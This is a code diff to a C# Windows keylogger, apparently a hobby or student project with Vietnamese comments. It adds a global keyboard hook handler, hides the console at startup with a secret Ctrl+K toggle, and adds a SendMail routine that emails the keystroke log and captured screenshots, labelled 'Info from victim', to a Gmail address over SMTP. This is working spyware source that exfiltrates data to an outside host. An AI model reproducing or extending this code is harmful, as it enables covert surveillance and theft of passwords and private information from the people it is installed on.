@@ -5,6 +5,7 @@ using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
+using System.Net.Mail;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
@@ -77,9 +78,10 @@ namespace KeyLogger
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
-                int vkCode = Marshal.ReadInt32(lParam); 
-
-                WriteLog(vkCode);
+                int vkCode = Marshal.ReadInt32(lParam);
+                //Console.WriteLine((Keys)vkCode);
+                CheckHotKey(vkCode);
+                //WriteLog(vkCode);
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
@@ -108,8 +110,58 @@ namespace KeyLogger
             Application.Run();
             UnhookWindowsHookEx(_hookID);
         }
-        #endregion
 
+        static bool isHotKey = false;
+        static bool isShowing = false;
+        static Keys previoursKey = Keys.Separator;
+
+        static void CheckHotKey(int vkCode)
+        {
+            if ((previoursKey == Keys.LControlKey || previoursKey == Keys.RControlKey) && (Keys)(vkCode) == Keys.K)
+                isHotKey = true;
+
+            if (isHotKey)
+            {
+                if (!isShowing)
+                {
+                    DisplayWindow();
+                }
+                else
+                    HideWindow();
+
+                isShowing = !isShowing;
+            }
+
+            previoursKey = (Keys)vkCode;
+            isHotKey = false;
+        }
+
+        #endregion
+        #region Windows
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();// lấy cái màn hình console hiện tại 
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        // hide window code
+        const int SW_HIDE = 0;
+
+        // show window code
+        const int SW_SHOW = 5;
+
+        static void HideWindow()
+        {
+            IntPtr console = GetConsoleWindow();
+            ShowWindow(console, SW_HIDE);
+        }
+
+        static void DisplayWindow()
+        {
+            IntPtr console = GetConsoleWindow();
+            ShowWindow(console, SW_SHOW);
+        }
+        #endregion
         #region Capture
         static string imagePath = "Image_";
         static string imageExtendtion = ".png";
@@ -182,10 +234,57 @@ namespace KeyLogger
             thread.Start();
         }
         #endregion
+        #region Mail
+        static int mailTime = 5000;
+        static void SendMail()
+        {
+            try
+            {
+                MailMessage mail = new MailMessage();
+                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
 
+                mail.From = new MailAddress("daihuyen174@gmail.com");
+                mail.To.Add("ngothanhdai74@gmail.com");
+                mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
+                mail.Body = "Info from victim\n";
+
+                string logFile = logName + DateTime.Now.ToLongDateString() + logExtendtion;
+
+                if (File.Exists(logFile))
+                {
+                    StreamReader sr = new StreamReader(logFile);
+
+                    mail.Body += sr.ReadToEnd();
+
+                    sr.Close();
+                }
+                string directoryImage = imagePath + DateTime.Now.ToLongDateString();
+                DirectoryInfo image = new DirectoryInfo(directoryImage);
+
+                foreach (FileInfo item in image.GetFiles("*.png"))
+                {
+                    if (File.Exists(directoryImage + "\\" + item.Name))
+                        mail.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
+                }
+
+                SmtpServer.Port = 587;
+                SmtpServer.Credentials = new System.Net.NetworkCredential("email@gmail.com", "password");
+                SmtpServer.EnableSsl = true;
+
+                SmtpServer.Send(mail);
+                // phải làm cái này ở mail dùng để gửi phải bật lên
+                // https://www.google.com/settings/u/1/security/lesssecureapps
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.ToString());
+            }
+        }
+        #endregion
 
         static void Main(string[] args)
         {
+            HideWindow();
             //StartTimmer();
             HookKeyboard();
         }
